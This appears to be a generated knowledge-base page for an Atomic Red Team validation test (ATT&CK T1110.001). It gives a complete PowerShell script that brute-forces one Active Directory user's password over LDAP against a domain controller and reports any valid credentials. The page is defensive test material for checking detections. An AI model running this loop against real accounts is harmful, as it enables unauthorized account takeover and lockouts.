---
atomic_guid: "c2969434-672b-4ec8-8df0-bbb91f40e250"
title: "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.001"
attack_technique_name: "Brute Force: Password Guessing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "c2969434-672b-4ec8-8df0-bbb91f40e250"
  - "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)

Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos

## Metadata

- Atomic GUID: c2969434-672b-4ec8-8df0-bbb91f40e250
- Technique: T1110.001: Brute Force: Password Guessing
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1110.001/T1110.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.001]]

## Input Arguments

### auth

- description: authentication method to choose between "NTLM" and "Kerberos"
- type: string
- default: NTLM

### domain

- description: Active Directory domain FQDN
- type: string
- default: $env:UserDnsDomain

### passwords_path

- description: List of passwords we will attempt to brute force with
- type: path
- default: PathToAtomicsFolder\T1110.001\src\passwords.txt

### user

- description: Account to bruteforce
- type: string
- default: $ENV:USERNAME

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
  Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
  exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)

$passwordList = Get-Content -Path "#{passwords_path}"
foreach ($password in $passwordList){
  $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
  try {
    Write-Host " [-] Attempting ${password} on account #{user}."
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] #{user}:${password} are valid credentials!"
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host "End of bruteforce"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml)
